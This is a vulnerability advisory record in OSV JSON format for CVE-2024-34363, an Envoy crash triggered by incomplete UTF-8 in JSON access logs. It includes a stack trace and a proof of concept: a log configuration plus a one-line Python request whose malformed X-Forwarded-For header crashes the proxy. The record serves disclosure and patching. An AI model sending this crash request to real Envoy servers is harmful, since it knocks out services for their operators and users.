{
  "modified": "2024-06-04T19:38:56Z",
  "published": "2024-06-04T19:38:56Z",
  "schema_version": "1.5.0",
  "id": "CVE-2024-34363",
  "aliases": [
    "GHSA-g979-ph9j-5gg4"
  ],
  "details": "### Summary\r\nDue to how Envoy invoked the nlohmann JSON library, the library could throw an uncaught exception from downstream data if incomplete UTF-8 strings were serialized. The uncaught exception would cause Envoy to crash. \r\n\r\n### Details\r\n\r\nWe were recently made aware of an issue with the access logger that can trigger a crash during processing of untrusted user input. \r\n\r\nThis makes it trivial to crash Envoy with a simple request.\r\n\r\nThis [nlohmann JSON exception](https://github.com/nlohmann/json/blob/8c391e04fe4195d8be862c97f38cfe10e2a3472e/include/nlohmann/detail/output/serializer.hpp#L605) would be thrown. \r\n\r\nExample partial stacktrace:\r\n\r\n```console\r\n#0  0x00007ffff7c8100b in raise () from /lib/x86_64-linux-gnu/libc.so.6\r\n#1  0x00007ffff7c60859 in abort () from /lib/x86_64-linux-gnu/libc.so.6\r\n#2  0x000055555df1d152 in Envoy::TerminateHandler::logOnTerminate() const::$_0::operator()() const (this=0x7ffff4bdf258)\r\n    at source/exe/terminate_handler.cc:19\r\n#3  0x000055555df1d0e1 in Envoy::TerminateHandler::logOnTerminate() const::$_0::__invoke() () at source/exe/terminate_handler.cc:16\r\n#4  0x000055556092e9cc in __cxxabiv1::__terminate(void (*)()) ()\r\n#5  0x000055556092ea37 in std::terminate() ()\r\n#6  0x000055556092eb99 in __cxa_throw ()\r\n#7  0x000055555f4d2bea in nlohmann::json_abi_v3_11_3::detail::serializer\u003cnlohmann::json_abi_v3_11_3::basic_json\u003cstd::map, std::vector, std::__cxx11::basic_string\u003cchar, std::char_traits\u003cchar\u003e, std::allocator\u003cchar\u003e \u003e, bool, long, unsigned long, double, std::allocator, nlohmann::json_abi_v3_11_3::adl_serializer, std::vector\u003cunsigned char, std::allocator\u003cunsigned char\u003e \u003e, void\u003e \u003e::dump_escaped (this=0x7ffff4bdf7b0, s=...,\r\n    ensure_ascii=false) at external/com_github_nlohmann_json/include/nlohmann/detail/output/serializer.hpp:605\r\n#8  0x000055555f4d0c9d in nlohmann::json_abi_v3_11_3::detail::serializer\u003cnlohmann::json_abi_v3_11_3::basic_json\u003cstd::map, std::vector, std::__cxx11::basic_string\u003cchar, std::char_traits\u003cchar\u003e, std::allocator\u003cchar\u003e \u003e, bool, long, unsigned long, double, std::allocator, nlohmann::json_abi_v3_11_3::adl_serializer, std::vector\u003cunsigned char, std::allocator\u003cunsigned char\u003e \u003e, void\u003e \u003e::dump (this=0x7ffff4bdf7b0, val=...,\r\n    pretty_print=false, ensure_ascii=false, indent_step=0, current_indent=0)\r\n    at external/com_github_nlohmann_json/include/nlohmann/detail/output/serializer.hpp:250\r\n#9  0x000055555f4d07e5 in nlohmann::json_abi_v3_11_3::detail::serializer\u003cnlohmann::json_abi_v3_11_3::basic_json\u003cstd::map, std::vector, std::__cxx11::basic_string\u003cchar, std::char_traits\u003cchar\u003e, std::allocator\u003cchar\u003e \u003e, bool, long, unsigned long, double, std::allocator, nlohmann::json_abi_v3_11_3::adl_serializer, std::vector\u003cunsigned char, std::allocator\u003cunsigned char\u003e \u003e, void\u003e \u003e::dump (this=0x7ffff4bdf7b0, val=...,\r\n    pretty_print=false, ensure_ascii=false, indent_step=0, current_indent=0)\r\n    at external/com_github_nlohmann_json/include/nlohmann/detail/output/serializer.hpp:180\r\n#10 0x000055555f4c3225 in nlohmann::json_abi_v3_11_3::basic_json\u003cstd::map, std::vector, std::__cxx11::basic_string\u003cchar, std::char_traits\u003cchar\u003e, std::allocator\u003cchar\u003e \u003e, bool, long, unsigned long, double, std::allocator, nlohmann::json_abi_v3_11_3::adl_serializer, std::vector\u003cunsigned char, std::allocator\u003cunsigned char\u003e \u003e, void\u003e::dump (this=0x7ffff4bdfa80, indent=-1, indent_char=32 ' ', ensure_ascii=false,\r\n    error_handler=nlohmann::json_abi_v3_11_3::detail::error_handler_t::strict)\r\n    at external/com_github_nlohmann_json/include/nlohmann/json.hpp:1286\r\n#11 0x000055555f4abb49 in Envoy::Json::Nlohmann::(anonymous namespace)::Field::asJsonString[abi:cxx11]() const (this=0x26a0bd072e60)\r\n    at source/common/json/json_internal.cc:573\r\n#12 0x0000555558f991b4 in Envoy::Formatter::CommonJsonFormatterBaseImpl\u003cEnvoy::Formatter::HttpFormatterContext\u003e::formatWithContext[abi:cxx11](Envoy::Formatter::HttpFormatterContext const\u0026, Envoy::StreamInfo::StreamInfo const\u0026) const (this=0x26a0bd060340, context=..., info=...)\r\n    at ./source/common/formatter/substitution_formatter.h:403\r\n#13 0x000055555f275dc2 in Envoy::Extensions::AccessLoggers::File::FileAccessLog::emitLog (this=0x26a0bd060610, context=..., stream_info=...)\r\n    at source/extensions/access_loggers/common/file_access_log_impl.cc:17\r\n#14 0x000055555f2761ef in Envoy::Extensions::AccessLoggers::Common::ImplBase::log (this=0x26a0bd060610, log_context=..., stream_info=...)\r\n    at source/extensions/access_loggers/common/access_log_base.cc:18\r\n#15 0x000055555ee94efc in Envoy::Http::FilterManager::log (this=0x26a0bd0d20a8, access_log_type=envoy::data::accesslog::v3::DownstreamEnd)\r\n    at ./source/common/http/filter_manager.h:702\r\n#16 0x000055555ee6e4f6 in Envoy::Http::ConnectionManagerImpl::doDeferredStreamDestroy (this=0x26a0bd0a7e40, stream=...)\r\n    at source/common/http/conn_manager_impl.cc:360\r\n#17 0x000055555ee6df0b in Envoy::Http::ConnectionManagerImpl::doEndStream (this=0x26a0bd0a7e40, stream=..., check_for_deferred_close=true)\r\n    at source/common/http/conn_manager_impl.cc:273\r\n#18 0x000055555ee9d17a in Envoy::Http::ConnectionManagerImpl::ActiveStream::endStream (this=0x26a0bd0d2000)\r\n    at ./source/common/http/conn_manager_impl.h:281\r\n#19 0x000055555f1f13b0 in Envoy::Http::FilterManager::maybeEndEncode (this=0x26a0bd0d20a8, end_stream=true)\r\n    at source/common/http/filter_manager.cc:1480\r\n```\r\n\r\n### PoC\r\n\r\nEnvoy configured with the following:\r\n\r\n```yaml\r\nlog_format:\r\n  json_format:\r\n    x_forwarded_for: '%REQ(X-FORWARDED-FOR)%'\r\n  json_format_options:\r\n    sort_properties: true\r\n```\r\n\r\nNote: this *requires* `sort_properties` to be `true`\r\n\r\nThe issue can then be triggered with the following requests: \r\n\r\n```console\r\n$ python -c 'import requests; requests.get(url=\"http://127.0.0.1:10000/\", headers={\"X-Forwarded-For\": \"\\xec\"})'\r\n```\r\n\r\n### Impact\r\n\r\nEnvoy users who either:\r\n\r\n- Used JSON access logs with `sort_properties` enabled and logged entities controlled by the downstream.\r\n- Used the HTTP composite filter and stored data from the downstream in the filter state objects.\r\n\r\n### Credits\r\n\r\nReporter: Seunghak Lee \u003cuseradd.temp@gmail.com\u003e, a DevOps engineer working at ktown4u in Korea. ",
  "affected": [
    {
      "package": {
        "ecosystem": "DHI",
        "name": "envoy",
        "purl": "pkg:dhi/envoy"
      },
      "ranges": [
        {
          "type": "SEMVER",
          "events": [
            {
              "introduced": "1.28.0"
            },
            {
              "fixed": "1.28.4"
            },
            {
              "introduced": "1.29.0"
            },
            {
              "fixed": "1.29.5"
            },
            {
              "introduced": "1.30.0"
            },
            {
              "fixed": "1.30.2"
            }
          ]
        }
      ],
      "database_specific": {
        "source_ecosystem": "envoyproxy",
        "source_package": "source/common/json/json_internal.cc"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/envoyproxy/envoy/security/advisories/GHSA-g979-ph9j-5gg4"
    }
  ]
}